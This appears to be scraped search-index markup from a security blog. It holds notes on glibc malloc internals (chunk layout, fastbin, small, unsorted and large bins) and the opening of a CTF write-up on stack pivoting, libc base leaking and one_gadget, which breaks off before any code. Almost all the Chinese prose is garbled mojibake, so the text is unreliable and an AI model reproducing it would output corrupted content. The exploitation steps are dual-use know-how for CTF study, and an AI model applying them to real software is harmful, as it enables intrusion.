          &lt;p&gt;ÂèÇËÄÉÔºö&lt;a href=&#34;https://www.yuque.com/cyberangel/rg9gdm/uhdudz#y9ecP&#34;&gt;cyberangel&lt;/a&gt;&lt;br&gt;
‰∏éÊ†àÁî±È´òÂú∞ÂùÄÂêëÂú∞ÂùÄÂÄºÂ¢ûÈïø‰∏çÂêåÔºåÂ†ÜÁî±Âú∞ÂùÄÂÄºÂêëÈ´òÂú∞ÂùÄÂ¢ûÈïøÔºåÂ¶ÇÂõæÔºö&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1678358275700.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
heapÂú®ÂáΩÊï∞Ë∞ÉÁî®mallocÔºàbrkÂ¢ûÂä†Ôºâ‰πãÂêéÊâç‰ºöË¢´ÂàÜÈÖç&lt;br&gt;
Â†ÜÂÜÖÂ≠òÁÆ°ÁêÜÁöÑ‰∏§ÁßçÁ≥ªÁªüË∞ÉÁî®Ôºö&lt;code&gt;(s)brk&lt;/code&gt;Âíå&lt;code&gt;mmap&lt;/code&gt;&lt;br&gt;
&lt;code&gt;(s)brk&lt;/code&gt;ÈÄöËøáÊîπÂèòÁ®ãÂ∫èÈó¥Êñ≠ÁÇπ‰ΩçÁΩÆÔºå‰ªéËÄåÊîπÂèòÊï∞ÊçÆÊÆµÈïøÂ∫¶ÔºåÊù•ÂàÜÈÖçÂÜÖÂ≠ò&lt;br&gt;
&lt;code&gt;mmap&lt;/code&gt;ÈÄöËøáÂú®Â†ÜÂíåÊ†à‰πãÈó¥ÊâæÁöÑ‰∏ÄÊÆµÁ©∫Èó≤ÂÜÖÂ≠òÂàÜÈÖçÔºåÂπ∂ÂàùÂßãÂåñ‰∏∫0&lt;br&gt;
ÂΩìÁî®Êà∑Áî≥ËØ∑‰∏ÄÊÆµÂ§ß‰∫é128kbÁöÑÂÜÖÂ≠òÊó∂ÈÄâÊã©&lt;code&gt;mmap&lt;/code&gt;ËÄå‰∏çÊòØ&lt;code&gt;(s)brk&lt;/code&gt;,&lt;br&gt;
&lt;a href=&#34;https://zhuanlan.zhihu.com/p/311527161&#34;&gt;zhihu&lt;/a&gt;&lt;br&gt;
ÂêåÁêÜÔºåÂΩìÁ©∫Èó≤ÂÜÖÂ≠òËøáÂ§öÊó∂&lt;code&gt;(s)brk&lt;/code&gt;‰πü‰ºöÈÄöËøáÊîπÂèòËá™Â∑±ÊåáÂêëÁöÑÂú∞ÂùÄ‰ª•Áº©ÂáèÁ©∫‰ΩôÂÜÖÂ≠ò&lt;br&gt;
ÂÜÖÂ≠òÂàÜÈÖçÊúâ‰ª•‰∏ãÁâπÁÇπÔºö&lt;br&gt;
1.ÂÖ∑ÊúâÈïøÁîüÂëΩÂë®ÊúüÁöÑÂ§ßÂÜÖÂ≠òÂàÜÈÖç‰ΩøÁî®mmap&lt;br&gt;
2.ÁâπÂà´Â§ßÁöÑÂÜÖÂ≠òÂàÜÈÖç‰ΩøÁî®mmap&lt;br&gt;
3.ÂÖ∑ÊúâÁü≠ÁîüÂëΩÂë®ÊúüÁöÑÂÜÖÂ≠òÂàÜÈÖç‰ΩøÁî®(s)brk&lt;br&gt;
4.Â∞ΩÈáèÂè™ÁºìÂ≠ò‰∏¥Êó∂‰ΩøÁî®ÁöÑÁ©∫Èó≤Â∞èÂÜÖÂ≠òÂø´ÔºåÂØπÂ§ßÂÜÖÂ≠òÂùóÊàñÊòØÈïøÁîüÂëΩÂë®ÊúüÁöÑÂ§ßÂÜÖÂ≠òÂùóÂú®ÈáäÊîæÊó∂ÈÉΩÁõ¥Êé•ÂΩíËøòÁªôÊìç‰ΩúÁ≥ªÁªü&lt;br&gt;
5.ÂØπÁ©∫Èó≤ÁöÑÂ∞èÂÜÖÂ≠òÂùóÂè™‰ºöÂú®mallocÂíåfreeÁöÑÊó∂ÂÄôËøõË°åÂêàÂπ∂ÔºåfreeÊó∂Á©∫Èó≤ÂÜÖÂ≠òÂùóÂèØËÉΩÊîæÂÖ•ÂÜÖÂ≠òÊ±†‰∏≠Ôºå‰∏ç‰∏ÄÂÆöÂΩíËøòÁªôÊìç‰ΩúÁ≥ªÁªü&lt;br&gt;
6.Êî∂Áº©Â†ÜÁöÑÊù°‰ª∂Êó∂ÂΩìÂâçfreeÁöÑÂùóÂ§ßÂ∞èÂä†‰∏äÂâçÂêéËÉΩÂêàÂπ∂ÁöÑchunkÁöÑÂ§ßÂ∞èÂ§ß‰∫é64kÔºåÂπ∂‰∏îÂ†ÜÈ°∂Â§ßÂ∞èËææÂà∞ÈòàÂÄºÔºåÊâçÊúâÂèØËÉΩÊî∂Áº©Â†ÜÔºåÊääÂ†ÜÊúÄÈ°∂Á´ØÁöÑÁ©∫Èó≤ÂÜÖÂ≠òËøîÂõûÁªôÊìç‰ΩúÁ≥ªÁªü&lt;/p&gt;
&lt;p&gt;‰∏ªÁ∫øÁ®ãÈ¶ñÊ¨°Ë∞ÉÁî®mallocÂàÜÈÖçÁöÑÂÜÖÂ≠ò‰πüÂè´ÂÅömain arenaÔºåÈùû‰∏ªÁ∫øÁ®ãmallocÊó∂‰∫ßÁîüthread arena&lt;br&gt;
Â¶ÇÊûúmain arenaÂÜÖÂ≠òÊó∂ÈÄöËøámmapÂêëÁ≥ªÁªüÂàÜÈÖçÁöÑÔºåfreeÊó∂‰ºöÁõ¥Êé•Ë∞ÉÁî®munmapÂ∞ÜËØ•ÂÜÖÂ≠òÂΩíËøòÁªôÁ≥ªÁªü&lt;br&gt;
ËÄåfreeË∞ÉÁî®‰πãÂêé‰∏ç‰ªÖ‰ºöÊ∏ÖÁ©∫Â†ÜÂùóÁöÑuser dataÔºåËøò‰ºöÂ∞ÜÊåáÂêëËØ•Â†ÜÂùóÁöÑÊåáÈíàÂ≠òÂÇ®Âà∞main_arena‰∏≠ÔºàÊàñÊòØfastbinÔºåÊ≥®ÊÑèÊåáÈíàÂíåÂú∞ÂùÄÂå∫Âà´ÂºÄÔºåÂú∞ÂùÄÂ≠òÊîæÁöÑÊåáÈíàÔºå64‰ΩçÊåáÈíà8Â≠óËäÇÔºå‰∏Ä‰∏™ arena È°∂ÈÉ®ÁöÑ chunk Âè´ÂÅö Top chunkÔºåÂÆÉ‰∏çÂ±û‰∫é‰ªª‰Ωï bin„ÄÇÂΩìÊâÄÊúâ bin ‰∏≠ÈÉΩÊ≤°ÊúâÁ©∫Èó≤ÁöÑÂèØÁî® chunk Êó∂ÔºåÊàë‰ª¨ÂàáÂâ≤ Top chunk Êù•Êª°Ë∂≥Áî®Êà∑ÁöÑÂÜÖÂ≠òÁî≥ËØ∑„ÄÇÂÅáËÆæ Top chunk ÂΩìÂâçÂ§ßÂ∞è‰∏∫ N Â≠óËäÇÔºåÁî®Êà∑Áî≥ËØ∑‰∫Ü K Â≠óËäÇÁöÑÂÜÖÂ≠òÔºåÈÇ£‰πà Top chunk Â∞ÜË¢´ÂàáÂâ≤‰∏∫Ôºö&lt;/p&gt;
&lt;p&gt;‰∏Ä‰∏™ K Â≠óËäÇÁöÑ chunkÔºåÂàÜÈÖçÁªôÁî®Êà∑&lt;br&gt;
‰∏Ä‰∏™ N-K Â≠óËäÇÁöÑ chunkÔºåÁß∞‰∏∫ Last Remainder chunk&lt;br&gt;
ÂêéËÄÖÊàê‰∏∫Êñ∞ÁöÑ Top chunk„ÄÇÂ¶ÇÊûúËøû Top chunk ÈÉΩ‰∏çÂ§üÁî®‰∫ÜÔºåÈÇ£‰πàÔºö&lt;/p&gt;
&lt;p&gt;Âú® main_arena ‰∏≠ÔºåÁî® brk() Êâ©Âº† Top chunk&lt;br&gt;
Âú® non_main_arena ‰∏≠ÔºåÁî® mmap() ÂàÜÈÖçÊñ∞ÁöÑÂ†Ü&lt;/p&gt;
&lt;p&gt;ÂØπ‰∫éÂ†Ü‰∏≠ÊúÄÂ∞èÂÜÖÂ≠òÁÆ°ÁêÜÂçï‰ΩçÔºåchunkÊù•ËØ¥ÔºåÂàÜ‰∏∫allocated chunkÔºåfree chunkÔºåtop chunkÔºåLast remainder chunkÂõõÁßçchunkÔºå‰ΩÜÂèàÂèØ‰ª•ÂàÜ‰∏∫allocated chunkÂíåfree chunk‰∏§ÁßçÔºåÊó†ËÆ∫‰∏Ä‰∏™ chunk ÁöÑÂ§ßÂ∞èÂ¶Ç‰ΩïÔºåÂ§Ñ‰∫éÂàÜÈÖçÁä∂ÊÄÅËøòÊòØÈáäÊîæÁä∂ÊÄÅÔºåÂÆÉ‰ª¨ÈÉΩ‰ΩøÁî®‰∏Ä‰∏™Áªü‰∏ÄÁöÑÁªìÊûÑ&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;/*
  This struct declaration is misleading (but accurate and necessary).
  It declares a &amp;quot;view&amp;quot; into memory allowing access to necessary
  fields at known offsets from a given base. See explanation below.
*/
struct malloc_chunk {

  INTERNAL_SIZE_T      prev_size;  /* Size of previous chunk (if free).  */
  INTERNAL_SIZE_T      size;       /* Size in bytes, including overhead. */

  struct malloc_chunk* fd;         /* double links -- used only if free. */
  struct malloc_chunk* bk;

  /* Only used for large blocks: pointer to next larger size.  */
  struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */
  struct malloc_chunk* bk_nextsize;
};
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;allocated chunkÔºö&lt;br&gt;
allocated chunckÂ∞±ÊòØÂ∑≤ÁªèÂàÜÈÖçÁªôÁî®Êà∑ÁöÑ chunkÔºåÂÖ∂ÂõæÁ§∫Â¶Ç‰∏ãÔºö&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1678636230575.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;chunkÔºöËØ• Allocated chunk ÁöÑËµ∑ÂßãÂú∞ÂùÄÔºõ
memÔºöËØ• Allocated chunk ‰∏≠Áî®Êà∑ÂèØÁî®Âå∫ÂüüÁöÑËµ∑ÂßãÂú∞ÂùÄÔºà= chunk + sizeof(malloc_chunk)ÔºâÔºõ
next_chunkÔºö‰∏ã‰∏Ä‰∏™ chunckÔºàÊó†ËÆ∫Á±ªÂûãÔºâÁöÑËµ∑ÂßãÂú∞ÂùÄ„ÄÇ
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Âú®Âõæ‰∏≠Ôºåchunk ÊåáÈíàÊåáÂêë‰∏Ä‰∏™ chunk ÁöÑÂºÄÂßãÔºå‰∏Ä‰∏™ chunk ‰∏≠ÂåÖÂê´‰∫ÜÁî®Êà∑ËØ∑Ê±ÇÁöÑÂÜÖÂ≠òÂå∫ÂüüÂíåÁõ∏ÂÖ≥ÁöÑÊéßÂà∂‰ø°ÊÅØ„ÄÇÂõæ‰∏≠ÁöÑ mem ÊåáÈíàÊâçÊòØÁúüÊ≠£ËøîÂõûÁªôÁî®Êà∑ÁöÑÂÜÖÂ≠òÊåáÈíà„ÄÇchunk ÁöÑÁ¨¨‰∫å‰∏™ÂüüÁöÑÊúÄ‰Ωé‰∏Ä‰Ωç‰∏∫ PÔºåÂÆÉË°®Á§∫Ââç‰∏Ä‰∏™ÂùóÊòØÂê¶Âú®‰ΩøÁî®‰∏≠ÔºåP ‰∏∫ 0 ÂàôË°®Á§∫Ââç‰∏Ä‰∏™ chunk ‰∏∫Á©∫Èó≤ÔºåËøôÊó∂chunk ÁöÑÁ¨¨‰∏Ä‰∏™Âüü prev_size ÊâçÊúâÊïàÔºåprev_size Ë°®Á§∫Ââç‰∏Ä‰∏™ chunk ÁöÑ sizeÔºåÁ®ãÂ∫èÂèØ‰ª•‰ΩøÁî®Ëøô‰∏™ÂÄºÊù•ÊâæÂà∞Ââç‰∏Ä‰∏™ chunk ÁöÑÂºÄÂßãÂú∞ÂùÄ„ÄÇÂΩì P ‰∏∫ 1 Êó∂ÔºåË°®Á§∫Ââç‰∏Ä‰∏™ chunk Ê≠£Âú®‰ΩøÁî®‰∏≠Ôºåprev_sizeÊó†ÊïàÔºåÁ®ãÂ∫è‰πüÂ∞±‰∏çÂèØ‰ª•ÂæóÂà∞Ââç‰∏Ä‰∏™chunkÁöÑÂ§ßÂ∞è„ÄÇ‰∏çËÉΩÂØπÂâç‰∏Ä‰∏™chunkËøõË°å‰ªª‰ΩïÊìç‰Ωú„ÄÇptmallocÂàÜÈÖçÁöÑÁ¨¨‰∏Ä‰∏™ÂùóÊÄªÊòØÂ∞Ü P ËÆæ‰∏∫ 1Ôºå‰ª•Èò≤Ê≠¢Á®ãÂ∫èÂºïÁî®Âà∞‰∏çÂ≠òÂú®ÁöÑÂå∫Âüü„ÄÇ&lt;br&gt;
Chunk ÁöÑÁ¨¨‰∫å‰∏™ÂüüÁöÑÂÄíÊï∞Á¨¨‰∫å‰∏™‰Ωç‰∏∫ MÔºå‰ªñË°®Á§∫ÂΩìÂâç chunk ÊòØ‰ªéÂì™‰∏™ÂÜÖÂ≠òÂå∫ÂüüËé∑ÂæóÁöÑËôöÊãüÂÜÖÂ≠ò„ÄÇM ‰∏∫ 1 Ë°®Á§∫ËØ• chunk ÊòØ‰ªé mmap Êò†Â∞ÑÂå∫ÂüüÂàÜÈÖçÁöÑÔºåÂê¶ÂàôÊòØ‰ªé heap Âå∫ÂüüÂàÜÈÖçÁöÑ„ÄÇChunk ÁöÑÁ¨¨‰∫å‰∏™ÂüüÂÄíÊï∞Á¨¨‰∏â‰∏™‰Ωç‰∏∫ AÔºåË°®Á§∫ËØ• chunk Â±û‰∫é‰∏ªÂàÜÈÖçÂå∫ÊàñËÄÖÈùû‰∏ªÂàÜÈÖçÂå∫ÔºåÂ¶ÇÊûúÂ±û‰∫éÈùû‰∏ªÂàÜÈÖçÂå∫ÔºåÂ∞ÜËØ•‰ΩçÁΩÆ‰∏∫ 1ÔºåÂê¶ÂàôÁΩÆ‰∏∫ 0„ÄÇ&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;free chunkÔºö&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1678636331695.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;prev_size: ‰∏§‰∏™Áõ∏ÈÇª free chunk ‰ºöË¢´ÂêàÂπ∂Êàê‰∏Ä‰∏™ÔºåÂõ†Ê≠§ËØ•Â≠óÊÆµÊÄªÊòØ‰øùÂ≠òÂâç‰∏Ä‰∏™ allocated chunk ÁöÑÁî®Êà∑Êï∞ÊçÆÔºõ
size: ËØ•Â≠óÊÆµ‰øùÂ≠òÊú¨ free chunk ÁöÑÂ§ßÂ∞èÔºõ
fd: Forward pointer ‚Äî‚Äî Êú¨Â≠óÊÆµÊåáÂêëÂêå‰∏Ä bin ‰∏≠ÁöÑ‰∏ã‰∏™ free chunkÔºàfree chunk ÈìæË°®ÁöÑÂâçÈ©±ÊåáÈíàÔºâÔºõ
bk: Backward pointer ‚Äî‚Äî Êú¨Â≠óÊÆµÊåáÂêëÂêå‰∏Ä bin ‰∏≠ÁöÑ‰∏ä‰∏™ free chunkÔºàfree chunk ÈìæË°®ÁöÑÂêéÁªßÊåáÈíàÔºâ„ÄÇ
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ÂΩì chunk Á©∫Èó≤Êó∂ÔºåÂÖ∂ M Áä∂ÊÄÅ‰∏çÂ≠òÂú®ÔºåÂè™Êúâ AP Áä∂ÊÄÅÔºåÂéüÊú¨ÊòØÁî®Êà∑Êï∞ÊçÆÂå∫ÁöÑÂú∞ÊñπÂ≠òÂÇ®‰∫ÜÂõõ‰∏™ÊåáÈíàÔºåÊåáÈíà fd ÊåáÂêëÂêé‰∏Ä‰∏™Á©∫Èó≤ÁöÑ chunkÔºåËÄå bk ÊåáÂêëÂâç‰∏Ä‰∏™Á©∫Èó≤ÁöÑ chunkÔºåptmalloc ÈÄöËøáËøô‰∏§‰∏™ÊåáÈíàÂ∞ÜÂ§ßÂ∞èÁõ∏ËøëÁöÑ chunk ËøûÊàê‰∏Ä‰∏™ÂèåÂêëÈìæË°®„ÄÇÂØπ‰∫é large bin ‰∏≠ÁöÑÁ©∫Èó≤ chunkÔºåËøòÊúâ‰∏§‰∏™ÊåáÈíàÔºåfd_nextsize Âíå bk_nextsizeÔºåËøô‰∏§‰∏™ÊåáÈíàÁî®‰∫éÂä†Âø´Âú® large bin ‰∏≠Êü•ÊâæÊúÄËøëÂåπÈÖçÁöÑÁ©∫Èó≤chunk„ÄÇ‰∏çÂêåÁöÑ chunk ÈìæË°®ÂèàÊòØÈÄöËøá bins ÊàñËÄÖ fastbins Êù•ÁªÑÁªáÁöÑ&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;bin:&lt;br&gt;
Áî®Êà∑ÈáäÊîæÊéâÁöÑ chunk ‰∏ç‰ºöÈ©¨‰∏äÂΩíËøòÁªôÁ≥ªÁªüÔºåptmalloc ‰ºöÁªü‰∏ÄÁÆ°ÁêÜ heap Âíå mmap Êò†Â∞ÑÂå∫Âüü‰∏≠ÁöÑÁ©∫Èó≤ÁöÑ chunk„ÄÇÂΩìÁî®Êà∑ÂÜç‰∏ÄÊ¨°ËØ∑Ê±ÇÂàÜÈÖçÂÜÖÂ≠òÊó∂Ôºåptmalloc ÂàÜÈÖçÂô®‰ºöËØïÂõæÂú®Á©∫Èó≤ÁöÑ chunk ‰∏≠ÊåëÈÄâ‰∏ÄÂùóÂêàÈÄÇÁöÑÁªôÁî®Êà∑„ÄÇËøôÊ†∑ÂèØ‰ª•ÈÅøÂÖçÈ¢ëÁπÅÁöÑÁ≥ªÁªüË∞ÉÁî®ÔºåÈôç‰ΩéÂÜÖÂ≠òÂàÜÈÖçÁöÑÂºÄÈîÄ„ÄÇ&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ptmalloc Â∞ÜÁõ∏‰ººÂ§ßÂ∞èÁöÑ chunk Áî®ÂèåÂêëÈìæË°®ÈìæÊé•Ëµ∑Êù•ÔºåËøôÊ†∑ÁöÑ‰∏Ä‰∏™ÈìæË°®Ë¢´Áß∞‰∏∫‰∏Ä‰∏™ bin„ÄÇPtmalloc ‰∏ÄÂÖ± Áª¥Êä§‰∫Ü 128 ‰∏™ binÔºåÂπ∂‰ΩøÁî®‰∏Ä‰∏™Êï∞ÁªÑÊù•Â≠òÂÇ®Ëøô‰∫õ bin&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1679211420803.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1678637134787.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;fastbin:&lt;br&gt;
ÂÖ±Êúâ10‰∏™fastbin&lt;br&gt;
ÁÆ°ÁêÜ 16„ÄÅ24„ÄÅ32„ÄÅ40„ÄÅ48„ÄÅ56„ÄÅ64 Bytes ÁöÑ free chunksÔºà32‰Ωç‰∏ãÈªòËÆ§Ôºâ&lt;br&gt;
ÂÖ∂‰∏≠ÁöÑ chunk ÁöÑ in_use ‰ΩçÔºà‰∏ã‰∏Ä‰∏™Áâ©ÁêÜÁõ∏ÈÇªÁöÑ chunk ÁöÑ P ‰ΩçÔºâÊÄª‰∏∫1&lt;br&gt;
ÂΩìÁî®Êà∑Áî≥ËØ∑‰∏Ä‰∏™Â∞è‰∫éÁ≠â‰∫é64bytesÁöÑÁ©∫Èó¥Êó∂‰ºöÈ¶ñÂÖàÊ£ÄÊü•ÂØπÂ∫îÂ§ßÂ∞èÁöÑfastbin‰∏≠ÊòØÂê¶ÂåÖÂê´Êú™Ë¢´‰ΩøÁî®ÁöÑchunkÔºåÂ¶ÇÊûúÂ≠òÂú®ÂàôÁõ¥Êé•Â∞ÜÂÖ∂‰ªéfastbin‰∏≠ÁßªÈô§Âπ∂ËøîÂõûÔºõÂê¶ÂàôÈÄöËøáÂÖ∂‰ªñÊñπÂºèÔºàÂâ™Âàátop chunkÔºâÂæóÂà∞‰∏ÄÂùóÁ¨¶ÂêàÂ§ßÂ∞èË¶ÅÊ±ÇÁöÑchunkÂπ∂ËøîÂõû&lt;/p&gt;
&lt;p&gt;small binÔºö&lt;br&gt;
Â¶ÇÊûúÁ®ãÂ∫èËØ∑Ê±ÇÁöÑÂÜÖÂ≠òËåÉÂõ¥‰∏çÂú® fast bin ÁöÑËåÉÂõ¥ÂÜÖÔºåÂ∞±‰ºöËÄÉËôë small bin„ÄÇÁÆÄÂçïÁÇπËØ¥Â∞±ÊòØÂ§ß‰∫é 80 Bytes Â∞è‰∫éÊüê‰∏Ä‰∏™ÂÄºÊó∂ÔºåÂ∞±‰ºöÈÄâÊã©ÂÆÉ„ÄÇ&lt;/p&gt;
&lt;p&gt;unsorted binÔºö&lt;br&gt;
ÂΩì fast bin„ÄÅsmall bin ‰∏≠ÁöÑ chunk ÈÉΩ‰∏çËÉΩÊª°Ë∂≥Áî®Êà∑ËØ∑Ê±Ç chunk Â§ßÂ∞èÊó∂ÔºåÂ†ÜÁÆ°ÁêÜÂô®Â∞±‰ºöËÄÉËôë‰ΩøÁî® unsorted bin „ÄÇÂÆÉ‰ºöÂú®ÂàÜÈÖç large chunk ‰πãÂâçÂØπÂ†Ü‰∏≠Á¢éÁâá chunk ËøõË°åÂêàÂπ∂Ôºå‰ª•‰æøÂáèÂ∞ëÂ†Ü‰∏≠ÁöÑÁ¢éÁâá„ÄÇ&lt;br&gt;
unsorted bin ‰∏é fast bin ‰∏çÂêåÔºå‰ªñ‰ΩøÁî®ÂèåÂêëÈìæË°®ÂØπ chunk ËøõË°åËøûÊé•&lt;/p&gt;
&lt;p&gt;unsorted ÁöÑÂ≠óÈù¢ÊÑèÊÄùÂ∞±ÊòØ‚Äù ‰∏çÂèØÂõûÊî∂‚Äù ÁöÑÊÑèÊÄùÔºåÂèØ‰ª•Áúã‰ΩúÂ∞Ü‰∏çÂèØÂõûÊî∂ÁöÑÂûÉÂúæÔºà‰∏çÊª°Ë∂≥ËÉΩÂ§üËøõË°åÂÜÖÂ≠òÂàÜÈÖçÁöÑÂ†ÜÂùóÔºâÈÉΩÊîæÂà∞Ëøô‰∏™‚Äù ÂûÉÂúæÊ°∂‚Äù ‰∏≠„ÄÇ&lt;/p&gt;
&lt;p&gt;large binÔºö&lt;br&gt;
ÂΩì fast bin„ÄÅsmall bin ‰∏≠ÁöÑ chunk ÈÉΩ‰∏çËÉΩÊª°Ë∂≥Áî®Êà∑ËØ∑Ê±Ç chunk Â§ßÂ∞èÊó∂ÔºåÂ∞±‰ºöËÄÉËôëÊòØ‰∏çÊòØ large bin„ÄÇ‰ΩÜÊòØÔºåÂÖ∂ÂÆûÂú® large bin ‰∏≠Âπ∂Ê≤°ÊúâÁõ¥Êé•ÂéªÊâ´ÊèèÂØπÂ∫î bin ‰∏≠ÁöÑ chunkÔºåËÄåÊòØÂÖàÂà©Áî® malloc_consolidateÔºàÂèÇËßÅ malloc_state Áõ∏ÂÖ≥ÂáΩÊï∞Ôºâ ÂáΩÊï∞Â§ÑÁêÜ fast bin ‰∏≠ÁöÑ chunkÔºåÂ∞ÜÊúâÂèØËÉΩËÉΩÂ§üÂêàÂπ∂ÁöÑ chunk ÂÖàËøõË°åÂêàÂπ∂ÂêéÊîæÂà∞ unsorted bin ‰∏≠Ôºå‰∏çËÉΩÂ§üÂêàÂπ∂ÁöÑÂ∞±Áõ¥Êé•ÊîæÂà∞ unsorted bin ‰∏≠ÔºåÁÑ∂ÂêéÂú®Â§ßÂæ™ÁéØ‰∏≠ËøõË°åÁõ∏Â∫îÁöÑÂ§ÑÁêÜ„ÄÇ&lt;/p&gt;
">glibc mallocÊú∫Âà∂Áï•ËØª</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/JI_Le20ep/"" data-c="
          &lt;p&gt;ÂÅö‰∫ÜËøôÈÅìÈ¢òÊâçÁÆóÊòØÁêÜËß£Ê†àËøÅÁßª‰∫ÜÔºå‰πãÂâçÈÇ£ÈÅìÊ†àËøÅÁßªÊ≤°ÊêûÊáÇÂéüÁêÜÂ∞±‰∫§Â∑Æ‰∫ÜÔºàüòì&lt;br&gt;
Ê≠§È¢ò64‰ΩçÔºå‰øùÊä§‰ªÖÂºÄÂêØnxÔºåstringsÈáåÈù¢Ê≤°Êúâ&lt;code&gt;system&lt;/code&gt;Êàñ&lt;code&gt;/bin/sh&lt;/code&gt;ÔºåËÄÉËôëÊ≥ÑÈú≤libcÂü∫ÂùÄ&lt;br&gt;
Êú¨È¢òÊúâ‰∏§Ê¨°ËæìÂÖ•&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1677918066895.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1677918157930.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
Á¨¨‰∏ÄÊ¨°ËæìÂÖ•ÂÜôÂÖ•bssÊÆµ‰∏äÁöÑ‰∏Ä‰∏™Âú∞ÂùÄÔºåËØ•Âú∞ÂùÄËµ∑Âßã‰∏∫0x404080&lt;br&gt;
Á¨¨‰∫åÊ¨°ËæìÂÖ•bufÔºåË∑ùÁ¶ªrbp‰∏∫&lt;code&gt;0x20&lt;/code&gt;Ôºå‰ΩÜÊòØÈôêÂà∂ËæìÂÖ•ÈïøÂ∫¶‰∏∫&lt;code&gt;0x30&lt;/code&gt;ÔºåÂàôÊ∫¢Âá∫ÈïøÂ∫¶‰ªÖÊúâ&lt;code&gt;0x8&lt;/code&gt;Â≠óËäÇÈïøÔºåÊ≠£Â∏∏ÁöÑropÈìæËÇØÂÆöË°å‰∏çÈÄöÔºå‰∫éÊòØËÄÉËôëÊ†àËøÅÁßª&lt;br&gt;
Ê†àËøÅÁßªÊú¨Ë¥®ÊòØÂà©Áî®‰∏§Ê¨°&lt;code&gt;leave&lt;/code&gt;(Â∞ÜÂáΩÊï∞ÁªìÊùüÂêéÁöÑ&lt;code&gt;ret_addr&lt;/code&gt;Ë¶ÜÁõñ‰∏∫&lt;code&gt;leave_ret_addr&lt;/code&gt;Âç≥ÂèØÔºåÂä´ÊåÅrspÂØÑÂ≠òÂô®Ôºå‰ª•Âèä‰∏ÄÊ¨°&lt;code&gt;ret&lt;/code&gt;ËææÂà∞Âà©Áî®ÁöÑÁõÆÁöÑÔºõ‰∏ãÈù¢ÊòØÊ†àËøÅÁßªÁöÑÂ§ßËá¥ÊâãÁªòÊÄùË∑ØÔºàÊ†àÂú∞ÂùÄÈÇ£ÂùóÂ∫î‰∏∫&lt;code&gt;old_rbp&lt;/code&gt;&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1677918532328.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
Á¨¨‰∏ÄÊ¨°ËæìÂÖ•ÂèØ‰ª•Â∏ÉÁΩÆROPÈìæÔºåÁ¨¨‰∫åÊ¨°ËæìÂÖ•ËøõË°åÊ†àËøÅÁßª&lt;br&gt;
ÈÄâÊã©Âú®&lt;code&gt;bss_addr+0x60&lt;/code&gt;Â§ÑËøõË°åÂ∏ÉÁΩÆÔºåÂèØ‰ª•ÈÅøÂÖçËÆøÈóÆ‰øÆÊîπ‰∫Ü‰∏ébssÊÆµÁõ∏ÈÇªÁöÑgotË°®Ôºå‰ΩÜÁ¨¨‰∏ÄÊ¨°ËæìÂÖ•ÊòØÂú®&lt;code&gt;bss_addr&lt;/code&gt;Â§ÑÂºÄÂßãÔºåÂàôÊàë‰ª¨ÈúÄË¶Å&lt;code&gt;0x60&lt;/code&gt;ÁöÑpaddingÂ°´ÂÖÖ&lt;br&gt;
Ê≠§È¢òÂè™ÈúÄËøÅÁßª1Ê¨°Ê†àÔºåÂàôËøÅÁßªÂêé‰º™Ê†àÁöÑÂ∏ÉÁΩÆÁöÑ&lt;code&gt;fake_addr&lt;/code&gt;ÂèØ‰∏∫‰ªªÊÑèÂÄºÔºàÂ¶Ç0xdeadbeef&lt;br&gt;
Ê≠§ÂêéÂºÄÂßãROPÈìæÂ∏ÉÁΩÆÔºåÁ¨¨‰∏ÄÊ¨°ÂÖàÊ≥ÑÈú≤Âá∫libcÂü∫ÂùÄÔºåÁÑ∂ÂêéËøîÂõûÁ¨¨‰∫åÊ¨°Ê∫¢Âá∫ÁöÑreadÂ§ÑÔºåÂç≥&lt;code&gt;vuln()&lt;/code&gt;Â§ÑÔºõ&lt;br&gt;
Âè¶Â§ñÔºåÊ≠§È¢òÊ∫¢Âá∫ÈïøÂ∫¶ËæÉÁü≠ÔºåÊó†Ê≥ï‰º†ÂèÇË∞ÉÁî®&lt;code&gt;system(/bin/sh)&lt;/code&gt;ÔºåÂè™ËÉΩ‰ΩøÁî®one_gadget&lt;br&gt;
ËøòÈúÄË¶ÅÊ≥®ÊÑèÁöÑ‰∏ÄÁÇπÊòØÔºåÊúÄÂêéreadÁöÑpadding‰∏∫&lt;code&gt;0x27&lt;/code&gt;ËÄå‰∏çÊòØ&lt;code&gt;0x28&lt;/code&gt;Âú®‰∫éÊú´Â∞æ‰ºöÂ§öÂá∫‰∏Ä‰∏™Êç¢Ë°åÁ¨¶ÔºåÂ¶ÇÊûú&lt;code&gt;0x28&lt;/code&gt;Âàô‰ºöÂØºËá¥ÊúÄÂêéretÂú∞ÂùÄÂ§öÂá∫1‰∏™Â≠óËäÇÂÜÖÂÆπ,Â¶ÇÂõæ&lt;br&gt;
